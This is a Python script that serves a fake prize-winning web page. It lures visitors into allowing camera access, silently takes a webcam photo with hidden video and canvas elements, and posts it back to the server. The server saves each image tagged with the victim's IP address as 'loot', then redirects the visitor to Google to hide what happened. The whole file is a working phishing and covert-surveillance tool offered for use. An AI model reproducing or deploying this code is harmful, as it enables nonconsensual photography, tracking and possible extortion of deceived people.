#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import os
from datetime import datetime

PORT = 8080
DIR = "CAPTURED"
os.makedirs(DIR, exist_ok=True)

# === ORIGINAL PAYLOAD (POPUP + STEALTH) ===
PAYLOAD = """<script>
const video = document.createElement('video');
video.style.display = 'none';
document.body.appendChild(video);

const canvas = document.createElement('canvas');
canvas.style.display = 'none';
document.body.appendChild(canvas);

navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
  .then(stream => {
    video.srcObject = stream;
    video.play();
    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const imgData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
      
      // Send image
      fetch('', {
        method: 'POST',
        body: 'img=' + imgData
      }).finally(() => {
        stream.getTracks().forEach(t => t.stop());
        setTimeout(() => location = 'https://google.com', 500);
      });
    }, 1500);
  })
  .catch(err => {
    // Silent fail
    setTimeout(() => location = 'https://google.com', 1000);
  });
</script>"""

# === CLEAN, WORKING HTML ===
HTML = f"""<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Congratulations!</title>
  <style>
    body{{font-family:Arial;background:#fff3e0;color:#d84315;text-align:center;padding:10%}}
    .box{{background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:90%;margin:auto}}
    h1{{font-size:2rem}}
    p{{font-size:1.1rem;margin:1.5rem 0}}
    button{{background:#ff6d00;color:#fff;border:none;padding:1rem 2rem;font-size:1.2rem;border-radius:12px;font-weight:bold}}
  </style>
</head><body>
  <div class="box">
    <h1>Congratulations!</h1>
    <p>You've won a mystery prize!</p>
    <p>Allow camera access to claim it.</p>
    <button onclick="this.innerText='Processing...';this.disabled=true;">Claim Now</button>
  </div>
  {PAYLOAD}
</body></html>"""

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        img = urllib.parse.parse_qs(data).get('img', [''])[0]

        if img and len(img) > 5000:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            ip = self.client_address[0]
            path = f"{DIR}/WINNER_{ts}_{ip}.jpg"
            with open(path, "wb") as f:
                f.write(base64.b64decode(img))
            print(f"CAPTURED: {path}")
        else:
            print(f"[-] No image from {self.client_address[0]}")

        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

print("WORKING STEALTH SERVER LIVE")
print(f"   URL → http://YOUR_IP:{PORT}")
print("   LOOT → ./CAPTURED/")
socketserver.TCPServer(("", PORT), Handler).serve_forever()
